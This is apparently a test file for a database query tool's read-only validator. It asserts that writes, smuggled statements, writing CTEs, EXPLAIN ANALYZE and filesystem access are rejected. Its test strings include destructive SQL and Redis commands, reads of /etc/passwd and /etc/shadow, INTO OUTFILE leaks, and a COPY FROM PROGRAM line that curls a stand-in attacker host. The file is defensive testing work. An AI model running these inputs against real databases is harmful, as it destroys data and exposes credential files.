import { describe, expect, test } from 'bun:test';
import {
  browseKind,
  canBrowse,
  isReadOnly,
  isReadOnlyCommand,
  isReadOnlyMongo,
  splitCommand,
} from '../src/catalog/browse.ts';

/**
 * Looking inside a database, and the rules that keep it safe.
 *
 * The query box runs whatever it is given against a real database. The first rule is
 * an allowlist of opening words rather than a search for dangerous ones, because a
 * denylist is a guess about every way somebody could write `DROP` and being wrong once
 * means losing a database.
 *
 * That was the only rule until 0.9.1, and it was not enough. `WITH` was on the
 * allowlist, and in PostgreSQL a common table expression can contain a statement that
 * changes data, so `WITH gone AS (DELETE FROM t RETURNING *) SELECT * FROM gone` opened
 * with an allowed word and emptied the table. Verified against a real PostgreSQL:
 * three rows before, none after. `EXPLAIN ANALYZE` had the same shape, because it runs
 * the statement rather than describing it.
 *
 * So the guarantee is no longer this function. `runQuery` runs everything inside a
 * read-only transaction, which is the engine refusing rather than a guess about syntax,
 * and covers the forms nobody has thought of yet. What is checked here is the rest:
 * reaching the filesystem, which a transaction has no opinion about, and giving people
 * a sentence they can act on instead of the engine's.
 */

describe('what counts as a read', () => {
  test('accepts the statements that only look', () => {
    for (const sql of [
      'SELECT * FROM users',
      'select id, name from users where id = 1',
      '  SELECT 1  ',
      'SHOW TABLES',
      'DESCRIBE users',
      'EXPLAIN SELECT * FROM users',
      'WITH recent AS (SELECT * FROM orders) SELECT * FROM recent',
      '(SELECT * FROM users)',
      'SELECT * FROM users;',
    ]) {
      expect(isReadOnly(sql)).toBe(true);
    }
  });

  test('refuses anything that writes', () => {
    for (const sql of [
      'DROP TABLE users',
      'DELETE FROM users',
      'UPDATE users SET admin = true',
      'INSERT INTO users VALUES (1)',
      'TRUNCATE users',
      'ALTER TABLE users ADD COLUMN x INT',
      'CREATE TABLE x (id INT)',
      'GRANT ALL ON users TO public',
      "COPY users FROM PROGRAM 'curl evil.test'",
    ]) {
      expect(isReadOnly(sql)).toBe(false);
    }
  });

  test('refuses a write smuggled in behind a read', () => {
    // The classic. A trailing semicolon is fine; a second statement is not, however
    // innocent the first one looks.
    for (const sql of [
      'SELECT 1; DROP TABLE users',
      'SELECT 1 ; DELETE FROM users',
      'SELECT 1;\nUPDATE users SET admin = true',
      'select * from users; truncate users;',
    ]) {
      expect(isReadOnly(sql)).toBe(false);
    }
  });

  test('refuses things that merely contain the word select', () => {
    expect(isReadOnly('DELETE FROM users WHERE id IN (SELECT id FROM banned)')).toBe(false);
    expect(isReadOnly('-- SELECT\nDROP TABLE users')).toBe(false);
  });

  test('refuses nothing at all', () => {
    expect(isReadOnly('')).toBe(false);
    expect(isReadOnly('   ')).toBe(false);
  });
});

describe('which engines can be browsed', () => {
  test('all six of them', () => {
    for (const engine of ['postgres', 'mysql', 'mariadb', 'mongodb', 'redis', 'valkey']) {
      expect(canBrowse(engine)).toBe(true);
    }
  });

  test('and nothing else', () => {
    expect(canBrowse(null)).toBe(false);
    expect(canBrowse('sqlite')).toBe(false);
    expect(canBrowse('')).toBe(false);
  });

  test('says which shape each one is, because the screen is not the same', () => {
    expect(browseKind('postgres')).toBe('sql');
    expect(browseKind('mariadb')).toBe('sql');
    expect(browseKind('mongodb')).toBe('documents');
    expect(browseKind('redis')).toBe('keys');
    expect(browseKind('valkey')).toBe('keys');
    expect(browseKind('sqlite')).toBeNull();
  });
});

/**
 * MongoDB's box runs a `mongosh` expression, which can do anything at all. The
 * allowlist is the same reasoning as the SQL one: naming the dangerous methods means
 * being wrong about one of them exactly once.
 */
describe('which mongo expressions only read', () => {
  test('accepts the ones people actually type', () => {
    for (const expression of [
      'db.users.find({ active: true })',
      'db.users.findOne({ _id: 1 })',
      'db.orders.aggregate([{ $group: { _id: "$status" } }])',
      'db.users.countDocuments({})',
      'db.getCollection("odd name").find({})',
      '  db.users.find({})  ;  ',
    ]) {
      expect(isReadOnlyMongo(expression)).toBe(true);
    }
  });

  test('refuses anything that writes, or that hides a write behind a read', () => {
    for (const expression of [
      'db.users.drop()',
      'db.users.deleteMany({})',
      'db.users.updateOne({}, { $set: { a: 1 } })',
      'db.users.insertOne({})',
      'db.users.find({}); db.users.drop()',
      'db.adminCommand("shutdown")',
      'db.runCommand({ dropDatabase: 1 })',
      // Not rooted at `db`, so there is no telling what it is.
      'process.exit(1)',
      'while (true) {}',
      '',
    ]) {
      expect(isReadOnlyMongo(expression)).toBe(false);
    }
  });
});

/**
 * Redis and Valkey. `KEYS` is absent from the allowlist deliberately: it only reads,
 * and running it against a large instance blocks the server for as long as it takes
 * to walk every key, which is how you take a site down from a page meant for looking.
 */
describe('which key commands only read', () => {
  test('accepts the reading ones, whatever the casing', () => {
    for (const command of [
      'get session:abc',
      'HGETALL user:1',
      'LRange jobs 0 10',
      'scan 0 match user:* count 50',
      'ttl greeting',
      'info memory',
    ]) {
      expect(isReadOnlyCommand(command)).toBe(true);
    }
  });

  test('refuses everything that writes, and KEYS, which does not', () => {
    for (const command of [
      'set greeting hello',
      'del greeting',
      'flushall',
      'FLUSHDB',
      'config set maxmemory 0',
      'shutdown',
      'keys *',
      '',
    ]) {
      expect(isReadOnlyCommand(command)).toBe(false);
    }
  });

  test('keeps a quoted argument together, so a value with a space survives', () => {
    expect(splitCommand('set greeting "two words"')).toEqual(['set', 'greeting', 'two words']);
    expect(splitCommand("get 'a key'")).toEqual(['get', 'a key']);
    expect(splitCommand('  get   spaced   ')).toEqual(['get', 'spaced']);
  });
});

/**
 * The ways past an allowlist of opening words.
 *
 * Every one of these was tried against a real PostgreSQL or MySQL before being written
 * down, and the first three worked: the table really was emptied by a statement the old
 * check called a read.
 */
describe('a statement that opens like a read and is not', () => {
  test('a common table expression cannot smuggle a write through', () => {
    for (const sql of [
      'WITH gone AS (DELETE FROM things RETURNING *) SELECT * FROM gone',
      'with x as (update things set id = 0 returning *) select * from x',
      'WITH t AS (INSERT INTO things VALUES (99) RETURNING *) SELECT * FROM t',
      'WITH a AS (SELECT 1), b AS (DELETE FROM things RETURNING *) SELECT * FROM b',
      'WITH d AS (DROP TABLE things) SELECT 1',
    ]) {
      expect(isReadOnly(sql)).toBe(false);
    }
  });

  test('EXPLAIN cannot either, because ANALYZE runs what it explains', () => {
    for (const sql of [
      'EXPLAIN ANALYZE DELETE FROM things',
      'explain analyze update things set id = 1',
      'EXPLAIN (ANALYZE) INSERT INTO things VALUES (1)',
    ]) {
      expect(isReadOnly(sql)).toBe(false);
    }
  });

  test('and neither can a query that reaches the filesystem', () => {
    // A read-only transaction has no opinion about these: reading a file is a read as
    // far as the engine is concerned. The role in a database container is often a
    // superuser, so `pg_read_file` is not limited to the data directory either.
    for (const sql of [
      "SELECT pg_read_file('/etc/passwd')",
      "select pg_read_binary_file('/etc/shadow')",
      "SELECT pg_ls_dir('/')",
      "SELECT lo_import('/etc/passwd')",
      "SELECT load_file('/etc/passwd')",
      "SELECT * FROM things INTO OUTFILE '/tmp/leak'",
      "select * from things into dumpfile '/tmp/leak'",
      "SELECT dblink_connect('host=10.0.0.1')",
    ]) {
      expect(isReadOnly(sql)).toBe(false);
    }
  });

  test('while the ordinary versions of all of that still work', () => {
    // The fix has to leave the feature usable. A `WITH` clause is the main reason
    // anybody writes a query in a box like this, and a column or a value that merely
    // contains the word "delete" is not a write.
    for (const sql of [
      'WITH recent AS (SELECT * FROM orders ORDER BY id DESC LIMIT 5) SELECT * FROM recent',
      'WITH a AS (SELECT 1), b AS (SELECT 2) SELECT * FROM a, b',
      'EXPLAIN ANALYZE SELECT * FROM things',
      "SELECT * FROM audit WHERE action = 'delete'",
      'SELECT deleted_at FROM things',
      "SELECT * FROM things WHERE note LIKE  '%create%'",
    ]) {
      expect(isReadOnly(sql)).toBe(true);
    }
  });
});
